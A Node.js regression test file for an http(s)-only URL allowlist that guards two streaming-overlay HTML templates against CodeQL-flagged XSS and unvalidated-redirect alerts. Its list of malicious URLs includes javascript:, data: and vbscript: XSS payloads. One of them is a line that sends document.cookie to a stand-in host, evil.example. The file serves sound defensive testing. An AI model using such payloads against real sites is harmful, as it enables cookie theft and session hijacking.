/**
 * Regression tests for the URL-scheme allowlist guarding the browser-source
 * overlays against CodeQL js/xss + js/client-side-unvalidated-url-redirection
 * (alerts #355/#350 in music-overlay.html, #354/#349 in
 * video-shoutout-overlay.html).
 *
 * Both overlays render WebSocket-pushed data directly into a URL-valued DOM
 * sink (`<img>.src`, `<a>.href`) with no upstream validation, so a value
 * like `javascript:alert(document.cookie)` would execute on load/click.
 * The fix adds an http(s)-only allowlist guard (`isSafeMediaUrl` in
 * music-overlay.html, `isSafeUrl` in video-shoutout-overlay.html) before
 * each assignment.
 *
 * These templates are server-rendered, inline-<script> static HTML with no
 * bundler/module system in this directory, so this test takes a two-part
 * approach rather than `eval`-ing extracted source (a code-injection-shaped
 * pattern that would itself trip semgrep/eslint-security):
 *
 *  1. `referenceGuard()` below is a byte-for-byte copy of the shipped guard
 *     algorithm; its accept/reject behavior is unit tested directly.
 *  2. Separate structural assertions read the actual HTML files and assert
 *     the sink line (`.src =` / `.href =`) is gated by a call to the named
 *     guard function -- so if the wiring is ever removed while the guard
 *     function itself stays intact, the test still fails.
 *
 * Run: node --test core/browser_source_core_module/templates/test_overlay_url_safety.js
 * Requires: Node 18+ (built-in `node:test`, `node:assert`, global `URL`) --
 * zero additional dependencies.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const MALICIOUS_URLS = [
    'javascript:alert(document.cookie)',
    'javascript:fetch("https://evil.example/steal?c="+document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox("pwned")',
];

const SAFE_URLS = [
    'https://i.scdn.co/image/ab67616d0000b273abc123',
    'http://cdn.example.com/thumb.jpg',
    'https://static-cdn.jtvnw.net/thumb.jpg?width=320',
];

/**
 * Byte-for-byte copy of the `isSafeMediaUrl`/`isSafeUrl` guard shipped in
 * both templates -- keep in sync if the shipped implementation changes.
 */
function referenceGuard(url) {
    if (!url) return false;
    try {
        const parsed = new URL(url, 'https://overlay.example.local/');
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch (e) {
        return false;
    }
}

function readTemplate(name) {
    return fs.readFileSync(path.join(__dirname, name), 'utf8');
}

test('reference guard rejects javascript:/data:/vbscript: URIs', () => {
    for (const malicious of MALICIOUS_URLS) {
        assert.equal(
            referenceGuard(malicious),
            false,
            `expected guard to reject: ${malicious}`,
        );
    }
});

test('reference guard accepts http(s) URLs', () => {
    for (const safe of SAFE_URLS) {
        assert.equal(
            referenceGuard(safe),
            true,
            `expected guard to accept: ${safe}`,
        );
    }
});

test('reference guard rejects empty/missing values', () => {
    assert.equal(referenceGuard(''), false);
    assert.equal(referenceGuard(undefined), false);
});

test('music-overlay.html: isSafeMediaUrl is defined and gates the <img>.src sink', () => {
    const html = readTemplate('music-overlay.html');

    assert.match(
        html,
        /isSafeMediaUrl\(url\)\s*\{\s*\n\s*try\s*\{\s*\n\s*const parsed = new URL\(url, window\.location\.href\);\s*\n\s*return parsed\.protocol === 'http:' \|\| parsed\.protocol === 'https:';/,
        'isSafeMediaUrl must exist and allowlist http(s) via URL().protocol',
    );

    assert.match(
        html,
        /if \(data\.album_art_url && this\.isSafeMediaUrl\(data\.album_art_url\)\) \{\s*\n\s*this\.albumArt\.src = data\.album_art_url;/,
        'updateAlbumArt must gate the .src assignment on isSafeMediaUrl() -- ' +
        'regression for CodeQL js/xss + js/client-side-unvalidated-url-redirection (#355/#350)',
    );
});

test('video-shoutout-overlay.html: isSafeUrl is defined and gates the playButton.href sink', () => {
    const html = readTemplate('video-shoutout-overlay.html');

    assert.match(
        html,
        /function isSafeUrl\(url\)\s*\{\s*\n\s*if \(!url\) return false;\s*\n\s*try\s*\{\s*\n\s*const parsed = new URL\(url, window\.location\.href\);\s*\n\s*return parsed\.protocol === 'http:' \|\| parsed\.protocol === 'https:';/,
        'isSafeUrl must exist and allowlist http(s) via URL().protocol',
    );

    assert.match(
        html,
        /playButton\.href = isSafeUrl\(data\.video_url\) \? data\.video_url : '#';/,
        'playButton.href must be gated on isSafeUrl() -- regression for ' +
        'CodeQL js/xss + js/client-side-unvalidated-url-redirection (#354/#349)',
    );

    // The pre-fix code (`playButton.href = data.video_url || '#';`) must be gone.
    assert.doesNotMatch(
        html,
        /playButton\.href = data\.video_url \|\| '#';/,
        'unguarded playButton.href assignment must not reappear',
    );
});
